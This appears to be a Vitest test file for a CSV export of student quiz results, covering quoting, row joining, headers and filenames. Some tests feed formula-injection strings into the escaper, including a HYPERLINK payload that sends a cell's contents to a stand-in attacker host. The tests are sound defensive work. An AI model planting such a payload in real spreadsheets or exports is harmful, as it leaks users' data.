import { describe, it, expect } from "vitest";
import {
  escapeCsvValue,
  toCsv,
  studentsToCsv,
  csvFilename,
  STUDENT_CSV_HEADERS,
} from "../src/lib/csv";
import type { StudentStat } from "../src/lib/metrics";

function student(over: Partial<StudentStat> = {}): StudentStat {
  return {
    uid: "u1",
    name: "Alice",
    score: 300,
    completionTime: 42,
    attempted: 4,
    correct: 3,
    accuracy: 75,
    wrongQuestions: ["Q2"],
    ...over,
  };
}

describe("escapeCsvValue", () => {
  it("quotes plain values", () => {
    expect(escapeCsvValue("Alice")).toBe('"Alice"');
    expect(escapeCsvValue(300)).toBe('"300"');
  });

  it("renders null and undefined as empty cells", () => {
    expect(escapeCsvValue(null)).toBe('""');
    expect(escapeCsvValue(undefined)).toBe('""');
  });

  it("preserves commas and newlines inside quotes", () => {
    expect(escapeCsvValue("Doe, Jane")).toBe('"Doe, Jane"');
    expect(escapeCsvValue("line1\nline2")).toBe('"line1\nline2"');
  });

  it("doubles embedded quotes", () => {
    expect(escapeCsvValue('She said "hi"')).toBe('"She said ""hi"""');
  });

  // Student names are free text, so a name can carry a spreadsheet formula.
  it("neutralises formula-injection payloads (CWE-1236)", () => {
    expect(escapeCsvValue("=1+1")).toBe(`"'=1+1"`);
    expect(escapeCsvValue("+1")).toBe(`"'+1"`);
    expect(escapeCsvValue("-1")).toBe(`"'-1"`);
    expect(escapeCsvValue("@SUM(A1)")).toBe(`"'@SUM(A1)"`);
    expect(escapeCsvValue("\tcmd")).toBe(`"'\tcmd"`);
    expect(escapeCsvValue("\rcmd")).toBe(`"'\rcmd"`);
  });

  it("neutralises a realistic exfiltration payload", () => {
    const payload = '=HYPERLINK("http://evil.test?d="&A1,"click")';
    const out = escapeCsvValue(payload);
    // Prefixed so it is inert, and internal quotes still escaped.
    expect(out.startsWith(`"'=HYPERLINK`)).toBe(true);
    expect(out).toContain('""');
  });

  it("leaves formula characters alone when not leading", () => {
    expect(escapeCsvValue("A=B")).toBe('"A=B"');
    expect(escapeCsvValue("Jean-Luc")).toBe('"Jean-Luc"');
  });
});

describe("toCsv", () => {
  it("joins cells with commas and rows with CRLF", () => {
    expect(toCsv([["a", "b"], ["c", "d"]])).toBe('"a","b"\r\n"c","d"');
  });

  it("returns an empty string for no rows", () => {
    expect(toCsv([])).toBe("");
  });
});

describe("studentsToCsv", () => {
  it("emits a header row followed by one row per student", () => {
    const csv = studentsToCsv([student(), student({ name: "Bob", score: 800 })]);
    const lines = csv.split("\r\n");
    expect(lines).toHaveLength(3);
    expect(lines[0]).toBe(STUDENT_CSV_HEADERS.map((h) => `"${h}"`).join(","));
    expect(lines[1]).toBe('"Alice","300","4","3","75","42"');
    expect(lines[2]).toContain('"Bob"');
  });

  it("emits only the header when there are no students", () => {
    expect(studentsToCsv([]).split("\r\n")).toHaveLength(1);
  });

  it("keeps a name containing a comma in a single cell", () => {
    const csv = studentsToCsv([student({ name: "Doe, Jane" })]);
    const dataRow = csv.split("\r\n")[1];
    expect(dataRow.startsWith('"Doe, Jane",')).toBe(true);
    // Header has 6 columns; the quoted comma must not add a 7th.
    expect(dataRow.match(/","/g)?.length).toBe(5);
  });
});

describe("csvFilename", () => {
  it("includes the date", () => {
    expect(csvFilename(new Date("2026-08-16T12:00:00Z"))).toBe(
      "ready-force-labs-results-2026-08-16.csv",
    );
  });
});
